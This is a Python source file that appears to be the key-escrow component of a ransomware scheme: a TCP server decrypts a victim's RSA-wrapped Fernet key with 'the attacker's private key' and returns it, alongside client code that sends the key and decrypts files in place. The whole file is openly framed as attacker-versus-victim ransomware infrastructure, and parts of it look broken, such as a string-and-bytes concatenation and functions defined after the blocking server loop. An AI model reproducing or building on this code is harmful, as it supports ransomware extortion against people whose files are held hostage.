
import socketserver
import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet

class ClientHandler(socketserver.BaseRequestHandler):

    def handle(self):
        encrypted_key = self.request.recv(1024).strip()
        print ("Implement decryption of data " + encrypted_key )
        
            # Load the private key (attacker's private key)
        with open("private_key.pem", "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,  # or the private key password
            )
        
        # Decrypt the symmetric key using RSA private key
        decrypted_symmetric_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    
        # Send the decrypted symmetric key back to victim
        self.request.sendall(decrypted_symmetric_key)

if __name__ == "__main__":
    HOST, PORT = "", 8000

    tcpServer =  socketserver.TCPServer((HOST, PORT), ClientHandler)
    try:
        tcpServer.serve_forever()
    except Exception as e: 
        print(f"There was an error: {e}")

def sendEncryptedKey(eKeyFilePath, hostname="localhost", port=8000):
    """
    Send encrypted symmetric key to the decryption server
    
    Args:
        eKeyFilePath: Path to the encrypted symmetric key file
        hostname: Server hostname (default: localhost)
        port: Server port (default: 8000)
    
    Returns:
        Server response (decrypted key or error message)
    """
    try:
        with socket.create_connection((hostname, port)) as sock:
            with open(eKeyFilePath, "rb") as file:
                encrypted_key_data = file.read()
                # Send the encrypted key to server
                sock.sendall(encrypted_key_data)
                
                # Receive response from server (should be decrypted key)
                response = sock.recv(4096)
                print(f"Server response received: {len(response)} bytes")
                return response
    except FileNotFoundError:
        print(f"Error: Encrypted key file not found: {eKeyFilePath}")
        return None
    except ConnectionRefusedError:
        print(f"Error: Could not connect to server at {hostname}:{port}")
        return None
    except Exception as e:
        print(f"Error sending encrypted key: {e}")
        return None

def decryptFile(filePath, key):
    """
    Decrypt a file using the provided symmetric key
    
    Args:
        filePath: Path to the encrypted file
        key: Symmetric encryption key (Fernet key)
    
    Returns:
        True if successful, False otherwise
    """
    try:
        # Create Fernet instance with the provided key
        if isinstance(key, bytes):
            fernet = Fernet(key)
        else:
            # If key is string, encode it
            fernet = Fernet(key.encode() if isinstance(key, str) else key)
        
        # Read encrypted file
        with open(filePath, "rb") as file:
            encrypted_data = file.read()
        
        # Decrypt the data
        decrypted_data = fernet.decrypt(encrypted_data)
        
        # Write decrypted data back to file
        with open(filePath, "wb") as file:
            file.write(decrypted_data)
        
        print(f"Successfully decrypted: {filePath}")
        return True
        
    except FileNotFoundError:
        print(f"Error: File not found: {filePath}")
        return False
    except Exception as e:
        print(f"Error decrypting file {filePath}: {e}")
        return False